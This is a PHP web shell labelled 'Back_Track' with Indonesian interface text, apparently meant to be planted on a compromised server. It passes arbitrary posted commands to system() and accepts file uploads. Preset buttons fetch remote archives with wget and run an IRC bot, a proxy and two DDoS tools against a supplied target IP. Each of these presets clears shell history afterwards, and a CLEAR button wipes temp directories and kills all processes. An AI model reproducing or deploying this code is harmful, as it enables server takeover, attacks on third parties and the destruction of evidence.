<title>.:+: Back_Track :+:.</title>
<body bgcolor="#3BB9FF">
<div align="center"><img src="http://baradja.files.wordpress.com/2008/09/backtrack.gif" <font face="Verdana" size="2"></div>
<?php

set_magic_quotes_runtime(0);

print "<style>body{font-family:trebuchet ms;font-size:10px;}hr{width:100%;height:2px;}</style>";
print "<center><h1>Back_Track</h1></center>";
print "<hr><hr>";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD  = `pwd`;
$UserID = `id`;
$DIR = `ls -al /var/tmp/.../`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>IP MU NIH:</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>SERVERNYA:</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>TYPE SYSTEMNYA:</b></td><td>$UName</td></tr>";
print "<tr><td><b>PERMISSIONSNYA:</b></td><td>$UserID</td></tr>";
print "<tr><td><b>VAR DIREKTORI:</b></td><td>$DIR</td></tr>";
print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "LIST" ) {
    $currentCMD = "ls -al";
}

if( $_POST['_act'] == "DIR" ) {
    $currentCMD = "ls -al /var/tmp/;ls -al /dev/shm/;ls -al /tmp/";
}

if( $_POST['_act'] == "CHECK" ) {
    $currentCMD = "ps x";
}

if( $_POST['_act'] == "IP" ) {
    $currentCMD = "ip a s";
}

if( $_POST['_act'] == "OPEN PORTS" ) {
    $currentCMD = "netstat -an";
}

if( $_POST['_act'] == "PSY" ) {
    $currentCMD = "cd /var/tmp/... ; wget http://uk.geocities.com/linuxipcop/samseng.tgz ; tar -zxvf samseng.tgz ; rm -rf samseng.tgz ; mv samseng .logs ; cd /var/tmp/.logs/...;./config $currentCMD $currentCMD;./fuck;./run;history -cr";
}

if( $_POST['_act'] == "PROXY" ) {
    $currentCMD = "mkdir /tmp/...;cd /tmp/.../;wget http://uk.geocities.com/linuxipcop/proxy.tgz;tar -zxvf proxy.tgz;rm -rf proxy.tgz;cd /tmp/pro/...;./prox -d -a -p $currentCMD;history -cr";
}

if( $_POST['_act'] == "CLEAR" ) {
    $currentCMD = "cd /var/tmp/;rm -rf ...;rm -rf /var/tmp/*;rm -rf /var/tmp/*.*;rm -rf /var/tmp/.*;rm -rf /tmp/*;rm -rf /tmp/*.*;rm -rf /tmp/.*;rm -rf /dev/shm/*;rm -rf /dev/shm/*.*;rm -rf /dev/shm/.*;kill -9 udp;killall -r perl;kill -9 tcp;history -cr;kill -9 -1";
}

if( $_POST['_act'] == "BOT" ) {
    $currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;wget http://uk.geocities.com/linuxipcop/bombat.tar.gz;tar -zxvf bombat.tar.gz;rm -rf bombat.tar.gz;cd /var/tmp/.../...;./fx cups $currentCMD $currentCMD $currentCMD $currentCMD $currentCMD;./load cups;history -cr";
}

if( $_POST['_act'] == "DDOS1" ) {
    $currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;wget http://uk.geocities.com/linuxipcop/bom.swf;mv bom.swf dds;perl dds $currentCMD 53 99999999999999999999 1> /tmp/cmdtemp 2>&1;cat /tmp/cmdtemp; rm ?/tmp/cmdtemp;perl dds $currentCMD 53 99999999999999999999";
}

if( $_POST['_act'] == "DDOS2" ) {
    $currentCMD = "mkdir /var/tmp/...;cd /var/tmp/...;wget http://uk.geocities.com/linuxipcop/bom2.swf;mv bom.swf super;chmod 755 super;./super $currentCMD 22 DorDorDorDor";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>ENTER:</b></td><td><input size=60 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"ENTER\"><input type=submit name=_act value=\"DDOS1\"><input type=submit name=_act value=\"DDOS2\"><input type=submit name=_act value=\"BOT\"><input type=submit name=_act value=\"PROXY\"><input type=submit name=_act value=\"PSY\"><input type=submit name=_act value=\"IP\"></td></tr>";

print "<tr><td><b>DIREKTORI:</b></td><td><input size=60 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"LIST\"><input type=submit name=_act value=\"DIR\"><input type=submit name=_act value=\"CHECK\"><input type=submit name=_act value=\"OPEN PORTS\"></td></tr>";

print "<tr><td><b>UPLOAD FILE:</b></td><td><input size=45 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"UPLOAD!\"></td></tr>";

print "<tr><td><input type=submit name=_act value=\"CLEAR\"></td></tr>";

print "</table></form><hr><hr>";

print "<table>";
print "<tr><td>Command Enter = Untuk menjalankan perintah.</td></tr>";
print "<tr><td>Command DDOS1 & DDOS2= Masukkan IP target di kolom ENTER.</td></tr>";
print "<tr><td>Command BOT = Masukkan nickbot identbot iptarget channel nickanda ENTER.</td></tr>";
print "<tr><td>Command PROXY = Masukkan port proxy di kolom ENTER.</td></tr>";
print "<tr><td>Command PSY = Masukkan ident(spasi)port di kolom ENTER.</td></tr>";
print "<tr><td>Command IP = Untuk mengetahui IP Shell.</td></tr>";
print "<tr><td>Command LIST = Untuk melihat isi direktori.</td></tr>";
print "<tr><td>Command DIR = Untuk melihat isi direktori var, tmp, dev.</td></tr>";
print "<tr><td>Command OPEN PORTS = Untuk melihat port yg terbuka.</td></tr>";
print "<tr><td>Command CLEAR = Untuk menghapus semua setting & service.</td></tr>";
print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "UPLOAD!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Yah Gagal neh Bozz..</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Cihuyy Uploadnya berhasil..</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>PERINTAH BERHASIL</b></center>";
}

exit;

?>